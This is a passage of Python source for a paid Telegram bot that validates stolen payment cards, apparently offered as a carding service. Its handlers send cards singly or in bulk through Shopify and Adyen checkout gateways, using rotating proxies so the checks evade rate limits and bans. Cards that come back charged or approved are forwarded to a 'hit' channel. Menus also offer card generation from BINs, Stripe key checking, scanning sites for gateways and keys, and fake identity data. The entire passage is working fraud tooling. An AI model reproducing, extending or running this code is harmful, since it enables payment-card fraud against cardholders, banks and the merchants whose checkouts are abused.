├─ <code>/merge</code> → Mᴇʀɢᴇ ᴍᴜʟᴛɪᴘʟᴇ ғɪʟᴇs
│    <code>/merge</code> (ʀᴇᴘʟʏ ᴛᴏ ғɪʟᴇs)
├─ <code>/collect</code> → Cᴏʟʟᴇᴄᴛ ᴄᴀʀᴅs ғʀᴏᴍ ᴍᴇssᴀɢᴇs
│    <code>/collect</code> (ᴛʜᴇɴ sᴇɴᴅ ᴄᴀʀᴅs)
└─ <code>/clean</code> → Cʟᴇᴀɴ ᴄᴀʀᴅs (ʀᴇᴍᴏᴠᴇ ᴇxᴘɪʀᴇᴅ)
     <code>/clean</code> (ʀᴇᴘʟʏ ᴛᴏ ғɪʟᴇ)"""

    buttons = [
        [Button.inline("Pᴀɢᴇ 2", b"tools_menu_page2",
                       style="primary", icon=5445350109862720603)],
        [Button.inline("Bᴀᴄᴋ", b"main_menu", style="danger",
                       icon=5445365692004071819)]
    ]

    await safe_edit(event, premium_emoji(tools_text), buttons=buttons, parse_mode='html')


@bot.on(events.CallbackQuery(data=b"tools_menu_page2"))
async def tools_menu_page2_callback(event):
    user_id = event.sender_id

    tools_text = """🛠️ <b>Tᴏᴏʟs Mᴇɴᴜ • Pᴀɢᴇ 2/3</b>

🔍 <b>Lᴏᴏᴋᴜᴘ </b>
├─ <code>/bin</code> → BIN ɪɴғᴏʀᴍᴀᴛɪᴏɴ
│    <code>/bin 415920</code>
│    <code>/bin 544422</code>
├─ <code>/sk</code> → Sᴛʀɪᴘᴇ Kᴇʏ Cʜᴇᴄᴋ
│    <code>/sk pk_live_xxxxxxxxxxxx</code>
│    <code>/sk pk_test_xxxxxxxxxxxx</code>
⚡ <b>Gᴇɴᴇʀᴀᴛᴏʀ</b>
└─ <code>/gen</code> → Gᴇɴᴇʀᴀᴛᴇ ᴄᴀʀᴅs
     <code>/gen 415920 10</code>
     <code>/gen 415920|12|2028|123 5</code>"""

    buttons = [
        [Button.inline("Pᴀɢᴇ 1", b"tools_menu", style="primary", icon=5445408306669582934),
         Button.inline("Pᴀɢᴇ 3", b"tools_menu_page3", style="primary", icon=5445350109862720603)],
        [Button.inline("Bᴀᴄᴋ", b"main_menu", style="danger",
                       icon=5445365692004071819)]
    ]

    await safe_edit(event, premium_emoji(tools_text), buttons=buttons, parse_mode='html')


@bot.on(events.CallbackQuery(data=b"tools_menu_page3"))
async def tools_menu_page3_callback(event):
    user_id = event.sender_id

    tools_text = """🛠️ <b>Tᴏᴏʟs Mᴇɴᴜ • Pᴀɢᴇ 3/3</b>

🌐 <b>IP & Dᴀᴛᴀ Tᴏᴏʟs</b>

├─ <code>/ip</code> → IP Lᴏᴏᴋᴜᴘ & Iɴғᴏʀᴍᴀᴛɪᴏɴ
│   <code>/ip 8.8.8.8</code>
│   <code>/ip 192.168.1.1</code>
├─ <code>/fake</code> → Gᴇɴᴇʀᴀᴛᴇ Fᴀᴋᴇ Dᴀᴛᴀ
│    <code>/fake us</code>
│    <code>/fake eg</code>
│    <code>/fake fr</code>
├─ <code>/scg</code> → Sᴄᴀɴ sɪᴛᴇ ғᴏʀ ɢᴀᴛᴇᴡᴀʏs & ᴋᴇʏs
│    <code>/scg https://example.com</code>
│    <code>/scg example.com</code>
└─ <code>/iban</code> → IBAN Vᴀʟɪᴅᴀᴛᴏʀ & Iɴғᴏ
     <code>/iban GB82WEST12345698765432</code>
     <code>/iban DE89370400440532013000</code>"""

    buttons = [
        [Button.inline("Pᴀɢᴇ 2", b"tools_menu_page2",
                       style="primary", icon=5445408306669582934)],
        [Button.inline("Bᴀᴄᴋ", b"main_menu", style="danger",
                       icon=5445365692004071819)]
    ]

    await safe_edit(event, premium_emoji(tools_text), buttons=buttons, parse_mode='html')


@bot.on(events.CallbackQuery(pattern=rb"price_fltr:(\d+):(\d+)"))
async def price_filter_callback(event):
    match = event.pattern_match
    filter_index = int(match.group(1).decode())
    user_id = int(match.group(2).decode())
    if event.sender_id != user_id:
        await event.answer("❌ Nᴏᴛ ʏᴏᴜʀ ғɪʟᴇ!", alert=True)
        return
    if user_id not in TEMP_FILE_DATA:
        await safe_edit(event, premium_emoji("❌ Fɪʟᴇ ɴᴏᴛ ғᴏᴜɴᴅ! Pʟᴇᴀsᴇ ᴜᴘʟᴏᴀᴅ ᴀɢᴀɪɴ."), parse_mode='html')
        return
    filters = await load_price_filters()
    gateway_filters = filters.get('shopify_global', DEFAULT_FILTERS)
    if filter_index >= len(gateway_filters):
        await event.answer("❌ Iɴᴠᴀʟɪᴅ ғɪʟᴛᴇʀ!", alert=True)
        return
    selected_filter = gateway_filters[filter_index]
    # Read cards but DON'T pop — start_mass_check's finally block handles cleanup
    file_data = TEMP_FILE_DATA[user_id]
    cards = file_data['cards']
    sites_data = await load_sites_with_price(user_id)
    if not sites_data:
        educational_no_sites = """⚠️ <b>Sᴇᴛᴜᴘ Rᴇǫᴜɪʀᴇᴅ: Nᴏ Sɪᴛᴇs Iɴ Yᴏᴜʀ Pᴏᴏʟ</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 <b>Hᴏᴡ DᴀʀᴋAɴᴏɴ Wᴏʀᴋs:</b>
Tᴏ ɢɪᴠᴇ ʏᴏᴜ ᴍᴀxɪᴍᴜᴍ sᴘᴇᴇᴅ ᴀɴᴅ ᴢᴇʀᴏ ɪɴᴛᴇʀғᴇʀᴇɴᴄᴇ, ᴇᴠᴇʀʏ ᴜsᴇʀ ᴍᴀɪɴᴛᴀɪɴs ᴛʜᴇɪʀ ᴏᴡɴ <b>Pʀɪᴠᴀᴛᴇ Sɪᴛᴇ & Pʀᴏxʏ Pᴏᴏʟ</b>!

📝 <b>Sᴛᴇᴘ-ʙʏ-Sᴛᴇᴘ Sᴇᴛᴜᴘ:</b>
1️⃣ <b>Aᴅᴅ Pʀᴏxɪᴇs (Mɪɴ 10):</b>
   • Usᴇ <code>/addproxy</code> <i>(ᴘᴀsᴛᴇ ᴘʀᴏxɪᴇs ᴏʀ ᴜᴘʟᴏᴀᴅ .ᴛxᴛ ғɪʟᴇ)</i>
2️⃣ <b>Aᴅᴅ Sɪᴛᴇs (Mɪɴ 10):</b>
   • Usᴇ <code>/addsites</code> <i>(ᴘᴀsᴛᴇ sɪᴛᴇs ᴏʀ ᴜᴘʟᴏᴀᴅ .ᴛxᴛ ғɪʟᴇ)</i>
   • Cʜᴏᴏsᴇ ʏᴏᴜʀ ᴘʀɪᴄᴇ ғɪʟᴛᴇʀ ($1-$20, $1-$30)
3️⃣ <b>Sᴛᴀʀᴛ Cʜᴇᴄᴋɪɴɢ:</b>
   • Rᴜɴ <code>/chk</code> ᴏʀ <code>/cc</code> ᴛᴏ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴄᴀʀᴅs!

📥 <i>Yᴏᴜ ᴄᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ʏᴏᴜʀ sᴀᴠᴇᴅ ʟɪsᴛs ᴀɴʏᴛɪᴍᴇ ᴡɪᴛʜ <code>/getsites</code> ᴀɴᴅ <code>/getproxy</code>.</i>"""
        await safe_edit(event, premium_emoji(educational_no_sites), parse_mode='html')
        return

    if len(sites_data) < 10 and user_id not in ADMIN_ID:
        insufficient_msg = f"""⚠️ <b>Iɴsᴜғғɪᴄɪᴇɴᴛ Sɪᴛᴇs ({len(sites_data)}/10)</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 Yᴏᴜ ᴄᴜʀʀᴇɴᴛʟʏ ʜᴀᴠᴇ <b>{len(sites_data)}</b> ᴡᴏʀᴋɪɴɢ sɪᴛᴇs ɪɴ ʏᴏᴜʀ ᴘᴏᴏʟ.
👑 A ᴍɪɴɪᴍᴜᴍ ᴏғ <b>10 sɪᴛᴇs</b> ɪs ʀᴇǫᴜɪʀᴇᴅ ᴛᴏ ᴇɴsᴜʀᴇ ʜɪɢʜ sᴘᴇᴇᴅ ᴀɴᴅ ᴀᴄᴄᴜʀᴀᴄʏ.

📝 <b>Hᴏᴡ ᴛᴏ ᴀᴅᴅ ᴍᴏʀᴇ:</b>
• Rᴇᴘʟʏ ᴛᴏ ᴀ <code>.txt</code> ғɪʟᴇ ᴡɪᴛʜ <code>/addsites</code>
• Oʀ sᴇɴᴅ:
  <code>/addsites
  https://site1.com
  https://site2.com</code>"""
        await safe_edit(event, premium_emoji(insufficient_msg), parse_mode='html')
        return

    if not selected_filter.get('all', False):
        filtered_sites = []
        for s in sites_data:
            price = s.get('price', 0)
            if selected_filter['min'] <= price < selected_filter['max']:
                filtered_sites.append(s['url'])
        sites_to_use = filtered_sites
    else:
        sites_to_use = [s['url'] for s in sites_data]
        
    if not sites_to_use:
        no_range_msg = f"""⚠️ <b>Nᴏ Sɪᴛᴇs Mᴀᴛᴄʜɪɴɢ Fɪʟᴛᴇʀ ({selected_filter['name']})</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 Nᴏɴᴇ ᴏғ ʏᴏᴜʀ {len(sites_data)} sᴀᴠᴇᴅ sɪᴛᴇs ғᴀʟʟ ᴡɪᴛʜɪɴ ᴛʜᴇ <b>{selected_filter['name']}</b> ᴘʀɪᴄᴇ ʀᴀɴɢᴇ.

💡 <b>Wʜᴀᴛ ʏᴏᴜ ᴄᴀɴ ᴅᴏ:</b>
1. Cʜᴏᴏsᴇ <b>"Aʟʟ Sɪᴛᴇs"</b> ᴡʜᴇɴ sᴛᴀʀᴛɪɴɢ <code>/chk</code>.
2. Usᴇ <code>/addsites</code> ᴛᴏ ᴀᴅᴅ sɪᴛᴇs ᴡɪᴛʜ ᴀ ᴡɪᴅᴇʀ ᴘʀɪᴄᴇ ʀᴀɴɢᴇ ($1-$30).
3. Rᴜɴ <code>/site</code> ᴛᴏ ᴄʜᴇᴄᴋ ᴀɴᴅ ʀᴇғʀᴇsʜ ʏᴏᴜʀ ᴄᴜʀʀᴇɴᴛ sɪᴛᴇ ᴘʀɪᴄᴇs."""
        await safe_edit(event, premium_emoji(no_range_msg), parse_mode='html')
        return
    await safe_edit(event, premium_emoji(f"🚀 Sᴛᴀʀᴛɪɴɢ ᴄʜᴇᴄᴋ ᴡɪᴛʜ ғɪʟᴛᴇʀ: {selected_filter['name']}\n\n📊 Sɪᴛᴇs: {len(sites_to_use)}\n💳 Cᴀʀᴅs: {len(cards)}\n💰 Mᴀx ᴘʀɪᴄᴇ: ${selected_filter['max']:.0f}"), parse_mode='html')
    await start_mass_check(user_id, cards, sites_to_use, event, max_price=selected_filter['max'])
    await event.answer(f"✅ Sᴛᴀʀᴛᴇᴅ ᴄʜᴇᴄᴋ ᴡɪᴛʜ {len(sites_to_use)} sɪᴛᴇs!", alert=False)


@bot.on(events.CallbackQuery(data=b"cancel_filter"))
async def cancel_filter_callback(event):
    user_id = event.sender_id
    if user_id in TEMP_FILE_DATA:
        file_data = TEMP_FILE_DATA.pop(user_id)
        if os.path.exists(file_data['file_path']):
            try:
                os.remove(file_data['file_path'])
            except:
                pass
    await safe_edit(event, premium_emoji("❌ Cᴀɴᴄᴇʟʟᴇᴅ."), parse_mode='html')
    await event.answer("✅ Cᴀɴᴄᴇʟʟᴇᴅ", alert=True)


@bot.on(events.NewMessage(pattern=r'/cc\s+'))
async def single_cc_check(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    if not await is_premium(user_id):
        await send_access_denied(event)
        return
    if not await check_cooldown(event, user_id):
        return
    sites = await load_sites(user_id)
    proxies = await load_proxies(user_id)
    if len(proxies) < 10 and user_id not in ADMIN_ID:
        proxies_guide = f"""⚠️ <b>Sᴇᴛᴜᴘ Rᴇǫᴜɪʀᴇᴅ: Iɴsᴜғғɪᴄɪᴇɴᴛ Pʀᴏxɪᴇs ({len(proxies)}/10)</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 <b>Wʜʏ ᴀʀᴇ ᴘʀᴏxɪᴇs ɴᴇᴇᴅᴇᴅ?</b>
Pʀᴏxɪᴇs ᴘʀᴏᴛᴇᴄᴛ ʏᴏᴜ ғʀᴏᴍ IP ʀᴀᴛᴇ-ʟɪᴍɪᴛs ᴀɴᴅ ʙᴀɴs ᴡʜɪʟᴇ ᴄʜᴇᴄᴋɪɴɢ ᴄᴀʀᴅs.

📝 <b>Hᴏᴡ ᴛᴏ Aᴅᴅ Pʀᴏxɪᴇs (Mɪɴ 10):</b>
• Sᴇɴᴅ:
  <code>/addproxy
  ip:port:user:pass
  ip:port:user:pass</code>
• Oʀ ʀᴇᴘʟʏ ᴛᴏ ᴀ <code>.txt</code> ғɪʟᴇ ᴡɪᴛʜ <code>/addproxy</code>

⚡ <i>Aʟʟ ғᴏʀᴍᴀᴛs sᴜᴘᴘᴏʀᴛᴇᴅ (HTTP, SOCKS5, Usᴇʀ:Pᴀss@Host:Pᴏʀᴛ)</i>"""
        await event.reply(premium_emoji(proxies_guide), parse_mode='html')
        return
        
    if len(sites) < 10 and user_id not in ADMIN_ID:
        sites_guide = f"""⚠️ <b>Sᴇᴛᴜᴘ Rᴇǫᴜɪʀᴇᴅ: Iɴsᴜғғɪᴄɪᴇɴᴛ Sɪᴛᴇs ({len(sites)}/10)</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 <b>Wʜʏ ᴀʀᴇ sɪᴛᴇs ɴᴇᴇᴅᴇᴅ?</b>
DᴀʀᴋAɴᴏɴ ᴄʜᴇᴄᴋs ʏᴏᴜʀ ᴄᴀʀᴅs ᴀɢᴀɪɴsᴛ ʏᴏᴜʀ ᴏᴡɴ ᴘʀɪᴠᴀᴛᴇ Sʜᴏᴘɪғʏ sᴛᴏʀᴇs ғᴏʀ ᴍᴀxɪᴍᴜᴍ ʜɪᴛ ʀᴀᴛᴇs.

📝 <b>Hᴏᴡ ᴛᴏ Aᴅᴅ Sɪᴛᴇs (Mɪɴ 10):</b>
• Sᴇɴᴅ:
  <code>/addsites
  https://site1.com
  https://site2.com</code>
• Oʀ ʀᴇᴘʟʏ ᴛᴏ ᴀ <code>.txt</code> ғɪʟᴇ ᴡɪᴛʜ <code>/addsites</code>
• Cʜᴏᴏsᴇ ʏᴏᴜʀ ᴘʀɪᴄᴇ ғɪʟᴛᴇʀ ᴛᴏ sᴀᴠᴇ sɪᴛᴇs!"""
        await event.reply(premium_emoji(sites_guide), parse_mode='html')
        return
    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ CC ғᴏʀᴍᴀᴛ. Usᴇ: <code>/cc ᴄᴀʀᴅ|ᴍᴍ|ʏʏ|ᴄᴠᴠ</code>"), parse_mode='html')
        return
    card = cards[0]
    status_msg = await event.reply(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ <code>{card}</code>..."), parse_mode='html')
    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        if result['status'] == 'Charged':
            status_header = "💎 CHARGED"
        elif result['status'] == 'Approved':
            status_header = "✅ APPROVED"
        elif result['status'] == 'Site Error':
            status_header = "⚠️ SITE ERROR"
        else:
            status_header = "❌ DECLINED"
        final_resp = f"""{status_header}

💳 CC <code>{result['card']}</code>

🛒 Gᴀᴛᴇᴡᴀʏ {result.get('gateway', 'Unknown')}
📝 Rᴇsᴘᴏɴsᴇ {result['message'][:150]}
💸 Pʀɪᴄᴇ {result.get('price', '-')}

🆔 BIN Iɴғᴏ {brand} - {bin_type} - {level}
🏦 Bᴀɴᴋ {bank}
🥰 Cᴏᴜɴᴛʀʏ {country} {flag}

💡 Mᴀᴅᴇ ʙʏ @OwnerGhostHex"""
        if 'Charged' in status_header or 'APPROVED' in status_header:
            await send_hit_to_channel(result['card'], result['status'], result['message'], result.get('gateway', 'Unknown'), result.get('price', '-'))
        await safe_edit(status_msg, premium_emoji(final_resp), parse_mode='html')
    except Exception as e:
        await safe_edit(status_msg, premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/chk(?:\s|$)'))
async def check_command(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    if not await is_premium(user_id):
        await send_access_denied(event)
        return
    if not await check_cooldown(event, user_id):
        return
    await process_file_with_filters(event, user_id)


# ─── ADYEN HANDLERS (/ady1, /ady2, /mady1, /mady2) ──────────────────────────

async def single_adyen_check_handler(event, gate_key: str):
    user_id = event.sender_id
    if not await is_premium(user_id):
        await send_access_denied(event)
        return
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    if not await check_cooldown(event, user_id):
        return
    proxies = await load_proxies(user_id)
    if len(proxies) < 10 and user_id not in ADMIN_ID:
        await event.reply(premium_emoji(f"⚠️ <b>Iɴsᴜғғɪᴄɪᴇɴᴛ Pʀᴏxɪᴇs!</b>\n\nYᴏᴜ ᴍᴜsᴛ ʜᴀᴠᴇ ᴀᴛ ʟᴇᴀsᴛ <b>10</b> ᴡᴏʀᴋɪɴɢ ᴘʀᴏxɪᴇs ɪɴ ʏᴏᴜʀ ᴘᴏᴏʟ ᴛᴏ ᴄʜᴇᴄᴋ ᴄᴀʀᴅs.\n📊 Cᴜʀʀᴇɴᴛ: <code>{len(proxies)}/10</code>\n\nUsᴇ <code>/addproxy</code> ᴛᴏ ᴀᴅᴅ ᴍᴏʀᴇ."), parse_mode='html')
        return
    cc_input = event.message.text.split(' ', 1)[1].strip() if ' ' in event.message.text else ""
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji(f"❌ Iɴᴠᴀʟɪᴅ CC ғᴏʀᴍᴀᴛ. Usᴇ: <code>/{gate_key} ᴄᴀʀᴅ|ᴍᴍ|ʏʏ|ᴄᴠᴠ</code>"), parse_mode='html')
        return
    card = cards[0]
    gate_info = ADYEN_GATE_MAP.get(gate_key, ADYEN_GATE_MAP.get("ady1", {"name": "Adyen"}))
    gate_name = gate_info.get("name", "Adyen")

    status_msg = await event.reply(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ <code>{card}</code> on {gate_name}..."), parse_mode='html')
    try:
        result = await check_adyen_card_with_retry(card, gateway_key=gate_key, proxies=proxies, max_retries=2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        if result['status'] == 'Charged':
            status_header = "💎 CHARGED"
        elif result['status'] == 'Approved':
            status_header = "✅ APPROVED"
        elif result['status'] == 'Site Error':
            status_header = "⚠️ SITE ERROR"
        else:
            status_header = "❌ DECLINED"
        final_resp = f"""{status_header}

💳 CC <code>{result['card']}</code>

🛒 Gᴀᴛᴇᴡᴀʏ {result.get('gateway', gate_name)}
📝 Rᴇsᴘᴏɴsᴇ {result['message'][:150]}
💸 Pʀɪᴄᴇ {result.get('price', '$0.00')}
🔑 PSP {result.get('psp', 'N/A')}

🆔 BIN Iɴғᴏ {brand} - {bin_type} - {level}
🏦 Bᴀɴᴋ {bank}
🥰 Cᴏᴜɴᴛʀʏ {country} {flag}

💡 Mᴀᴅᴇ ʙʏ @OwnerGhostHex"""
        if 'Charged' in status_header or 'APPROVED' in status_header:
            await send_hit_to_channel(result['card'], result['status'], result['message'], result.get('gateway', gate_name), result.get('price', '-'))
        await safe_edit(status_msg, premium_emoji(final_resp), parse_mode='html')
    except Exception as e:
        await safe_edit(status_msg, premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


async def mass_adyen_check_handler(event, gate_key: str):
    user_id = event.sender_id
    if not await is_premium(user_id):
        await send_access_denied(event)
        return
    if not await check_cooldown(event, user_id):
        return

    # Get username for hit notifications
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    content = None
    if event.is_reply:
        reply_msg = await event.get_reply_message()
        if reply_msg and reply_msg.file and reply_msg.file.name and reply_msg.file.name.endswith('.txt'):
            file_path = await reply_msg.download_media()
            try:
                async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = await f.read()
                os.remove(file_path)
            except:
                pass
        elif reply_msg and reply_msg.text:
            content = reply_msg.text
    elif event.file and event.file.name and event.file.name.endswith('.txt'):
        file_path = await event.download_media()
        try:
            async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = await f.read()
            os.remove(file_path)
        except:
            pass

    if not content:
        lines = event.message.text.splitlines()
        if len(lines) > 1:
            content = '\n'.join(lines[1:])
        elif len(event.message.text.split(None, 1)) > 1:
            content = event.message.text.split(None, 1)[1]

    if not content:
        await event.reply(premium_emoji(f"❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ ᴏʀ ᴀ ᴍᴇssᴀɢᴇ ᴡɪᴛʜ CCs:\n<code>/{gate_key}</code>"), parse_mode='html')
        return

    raw_cards = extract_cc(content)
    if not raw_cards:
        await event.reply(premium_emoji("❌ Nᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅs ғᴏᴜɴᴅ."), parse_mode='html')
        return

    deduped_cards = list(dict.fromkeys(raw_cards))
    current_year = datetime.now().year
    current_month = datetime.now().month
    valid_cards = []
    for card in deduped_cards:
        parts = card.split('|')
        if len(parts) >= 3:
            try:
                card_year = int(parts[2])
                card_month = int(parts[1])
                if card_year < 100:
                    card_year += 2000
                if card_year > current_year or (card_year == current_year and card_month >= current_month):
                    valid_cards.append(card)
            except:
                valid_cards.append(card)
        else:
            valid_cards.append(card)

    if not valid_cards:
        await event.reply(premium_emoji("❌ Nᴏ ᴠᴀʟɪᴅ/ᴜɴᴇxᴘɪʀᴇᴅ ᴄᴀʀᴅs ғᴏᴜɴᴅ."), parse_mode='html')
        return

    stats = await db_manager.get_user_stats(user_id)
    plan_key = stats.get('plan', 'junior')
    
    # Adyen limits: 250 for jr/pro, 500 for premium
    adyen_limit = 500 if plan_key == 'premium' else 250
    max_cards = stats.get('custom_limit') or adyen_limit

    if user_id not in ADMIN_ID and len(valid_cards) > max_cards:
        TEMP_FILE_DATA[f"{user_id}_overlimit_adyen"] = {
            'cards': valid_cards,
            'max_cards': max_cards,
            'gate_key': gate_key,
            'username': username
        }
        overlimit_buttons = [
            [Button.inline(f"✅ Cʜᴇᴄᴋ ғɪʀsᴛ {max_cards:,}", f"chk_trunc_adyen:{max_cards}:{gate_key}:{user_id}".encode(), style="primary", icon=5348503265967355284)],
            [Button.inline(f"✂️ Sᴘʟɪᴛ ɪɴᴛᴏ {max_cards:,} ᴇᴀᴄʜ", f"chk_split_adyen:{max_cards}:{user_id}".encode(), style="success", icon=5444931419270839381)],
            [Button.inline("  Cᴀɴᴄᴇʟ", f"chk_overlimit_cancel:{user_id}".encode(), style="danger", icon=4915853119839011973)]
        ]
        await event.reply(
            premium_emoji(f"⚠️ <b>Fɪʟᴇ Exᴄᴇᴇᴅs Pʟᴀɴ Lɪᴍɪᴛ!</b>\n\n📊 Yᴏᴜʀ ғɪʟᴇ: <b>{len(valid_cards):,}</b> ᴠᴀʟɪᴅ ᴄᴀʀᴅs\n👑 Yᴏᴜʀ ʟɪᴍɪᴛ: <b>{max_cards:,}</b> ᴄᴀʀᴅs ᴘᴇʀ ᴄʜᴇᴄᴋ\n\n🔽 Wʜᴀᴛ ᴡᴏᴜʟᴅ ʏᴏᴜ ʟɪᴋᴇ ᴛᴏ ᴅᴏ?"),
            buttons=overlimit_buttons,
            parse_mode='html'
        )
        return

    proxies = await load_proxies(user_id)
    if len(proxies) < 10 and user_id not in ADMIN_ID:
        await event.reply(premium_emoji(f"⚠️ <b>Iɴsᴜғғɪᴄɪᴇɴᴛ Pʀᴏxɪᴇs!</b>\n\nYᴏᴜ ᴍᴜsᴛ ʜᴀᴠᴇ ᴀᴛ ʟᴇᴀsᴛ <b>10</b> ᴡᴏʀᴋɪɴɢ ᴘʀᴏxɪᴇs ɪɴ ʏᴏᴜʀ ᴘᴏᴏʟ ᴛᴏ ᴄʜᴇᴄᴋ ᴄᴀʀᴅs.\n📊 Cᴜʀʀᴇɴᴛ: <code>{len(proxies)}/10</code>\n\nUsᴇ <code>/addproxy</code> ᴛᴏ ᴀᴅᴅ ᴍᴏʀᴇ."), parse_mode='html')
        return

    gate_info = ADYEN_GATE_MAP.get(gate_key, ADYEN_GATE_MAP.get("ady1", {"name": "Adyen"}))
    gate_name = gate_info.get("name", "Adyen")

    if user_id in active_user_checks and user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Yᴏᴜ ᴀʟʀᴇᴀᴅʏ ʜᴀᴠᴇ ᴀ ᴍᴀss-ᴄʜᴇᴄᴋ ʀᴜɴɴɪɴɢ! Pʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ɪᴛ ᴛᴏ ғɪɴɪsʜ ᴏʀ ᴜsᴇ /stop."), parse_mode='html')
        return
    if user_id not in ADMIN_ID:
        active_user_checks.add(user_id)

    status_msg = await event.reply(premium_emoji(f"🔥 Sᴛᴀʀᴛɪɴɢ ᴄʜᴇᴄᴋ ғᴏʀ {len(valid_cards)} ᴄᴀʀᴅs on {gate_name}..."), parse_mode='html')
    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}

    results = {
        'charged': [], 'approved': [], 'dead': [], 'errors': [],
        'total': len(valid_cards), 'checked': 0, 'start_time': time.time(),
        'last_card': '', 'last_response': '', 'last_price': '$0.00', 'last_gateway': gate_name
    }

    try:
        queue = asyncio.Queue()
        for c in valid_cards:
            queue.put_nowait(c)

        sem = asyncio.Semaphore(min(len(proxies) * 2, 20))

        async def worker():
            while not queue.empty() and session_key in active_sessions:
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                async with sem:
                    res = await check_adyen_card_with_retry(card, gateway_key=gate_key, proxies=proxies, max_retries=2)
                results['checked'] += 1
                results['last_card'] = card
                results['last_response'] = (res.get('message') or '')[:35]
                results['last_price'] = res.get('price', '$0.00')
                results['last_gateway'] = res.get('gateway', gate_name)

                if res['status'] == 'Charged':
                    results['charged'].append(res)
                    await send_realtime_hit(user_id, res, 'Charged', username)
                    await send_hit_to_channel(res['card'], res['status'], res['message'], res.get('gateway', gate_name), res.get('price', '-'))
                elif res['status'] == 'Approved':
                    results['approved'].append(res)
                    await send_realtime_hit(user_id, res, 'Approved', username)
                    await send_hit_to_channel(res['card'], res['status'], res['message'], res.get('gateway', gate_name), res.get('price', '-'))
                elif res['status'] == 'Dead':
                    results['dead'].append(res)
                else:
                    results['errors'].append(res)
                queue.task_done()

        workers = [asyncio.create_task(worker()) for _ in range(20)]
        last_ui_update = time.time()
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)

            now = time.time()
            if now - last_ui_update >= 3.5:
                last_ui_update = now
                if session_key in active_sessions:
                    try:
                        await update_progress(event.chat_id, user_id, status_msg.id, results, results['checked'])
                    except:
                        pass
        if session_key in active_sessions:
            await update_progress(event.chat_id, user_id, status_msg.id, results, results['checked'])
    except Exception as e:
        await bot.send_message(event.chat_id, premium_emoji(f"❌ Aɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ: {e}"), parse_mode='html')
    finally:
        if user_id in active_user_checks:
            active_user_checks.remove(user_id)
        if session_key in active_sessions:
            del active_sessions[session_key]

        try:
            await status_msg.delete()
        except:
            pass
        await send_final_results(user_id, event.chat_id, results)
        try:
            await db_manager.log_check_session(
                user_id, results['total'],
                len(results.get('charged', [])),
                len(results.get('approved', [])),
                len(results.get('dead', [])),
                len(results.get('errors', []))
            )
        except:
            pass
        SHOPIFY_SESSION_RESULTS[user_id] = results
        await asyncio.sleep(300)
        SHOPIFY_SESSION_RESULTS.pop(user_id, None)


@bot.on(events.NewMessage(pattern=r'^/(addproxy|addmyproxy)(?:\s+([\s\S]+))?'))
async def add_proxy_command(event):
    user_id = event.sender_id
    try:
        raw_text = event.pattern_match.group(2)
        proxies_to_add = []
        
        # 1. Check reply to txt file or text
        if event.reply_to_msg_id:
            reply_msg = await event.get_reply_message()
            if reply_msg and reply_msg.file and reply_msg.file.name.endswith('.txt'):
                file_path = await reply_msg.download_media()
                async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = await f.read()
                    for line in content.splitlines():
                        parsed = parse_proxy_line(line)
                        if parsed:
                            proxies_to_add.append(parsed)
                try:
                    os.remove(file_path)
                except:
                    pass
            elif reply_msg and reply_msg.text:
                for line in reply_msg.text.splitlines():
                    parsed = parse_proxy_line(line)
                    if parsed:
                        proxies_to_add.append(parsed)
                        
        # 2. Check text passed directly after command
        if not proxies_to_add and raw_text:
            for line in raw_text.splitlines():
                parsed = parse_proxy_line(line)
                if parsed:
                    proxies_to_add.append(parsed)
                    
        # 3. Check whole message lines if multiline
        if not proxies_to_add:
            msg_lines = event.message.text.splitlines()
            if len(msg_lines) > 1:
                for line in msg_lines[1:]:
                    parsed = parse_proxy_line(line)
                    if parsed:
                        proxies_to_add.append(parsed)

        if not proxies_to_add:
            await event.reply(
                premium_emoji("📝 <b>Usᴀɢᴇ:</b>\n\n1. Rᴇᴘʟʏ ᴛᴏ ᴀ <code>.txt</code> ғɪʟᴇ ᴡɪᴛʜ <code>/addproxy</code>\n2. Oʀ sᴇɴᴅ:\n<code>/addproxy\nip:port:user:pass\nip:port:user:pass</code>"),
                parse_mode='html'
            )
            return

        current_count = await db_manager.count_user_proxies(user_id)
        if current_count >= 200:
            await event.reply(
